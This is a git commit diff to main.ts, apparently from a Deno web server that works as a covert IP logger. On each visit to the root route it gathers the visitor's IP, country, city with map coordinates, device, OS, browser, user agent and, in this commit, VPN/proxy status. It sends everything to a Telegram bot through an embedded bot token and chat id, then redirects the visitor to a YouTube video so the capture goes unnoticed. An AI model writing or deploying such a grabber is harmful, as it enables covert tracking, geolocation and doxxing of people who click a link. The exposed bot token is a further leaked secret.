3e0ca569712634c5998cee2df58cd1513af97a4f
MOAYAD <101659441+MOA-YAD@users.noreply.github.com>
2024-03-30 13:19:51 +0300

    Update main.ts

--- main.ts
+++ main.ts
@@ -16,13 +16,14 @@ router.get("/", async (ctx) => {
   const countryinfo = encodeURIComponent(`**COUNTRY** : \`${info.country}\``);
   const cityInfo = encodeURIComponent(`**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}\)`);
   const iptext = encodeURIComponent(`**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`);
+  const vpn = encodeURIComponent(`**VPN** : ${info.proxy}`);
   const device_v = encodeURIComponent(`**DEVICE** : ${device.type}`);
   const device_os = encodeURIComponent(`**SYSTEM** : ${os.name}`);
   const browser_v = encodeURIComponent(`**BROWSER** : ${browser.name}`);
   const userAgentString_v = encodeURIComponent(`**userAgentString** : \`\`\`ts ${userAgentString}\`\`\``);
   console.log(info)
    await fetch(
-    `https://api.telegram.org/bot6823782631:AAFbVnSSQYMnkct09VWaZic6_wnuCW-L1ps/sendMessage?chat_id=1495309346&text=${iptext}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${countryinfo}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${cityInfo}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${device_v}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${browser_v}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${device_os}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${userAgentString_v}&parse_mode=markdown`,
+    `https://api.telegram.org/bot6823782631:AAFbVnSSQYMnkct09VWaZic6_wnuCW-L1ps/sendMessage?chat_id=1495309346&text=${iptext}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${vpn}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${countryinfo}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${cityInfo}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${device_v}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${browser_v}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${device_os}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${userAgentString_v}&parse_mode=markdown`,
    );
 
   ctx.response.redirect("https://youtu.be/oRdxUFDoQe0?t=1m15s");
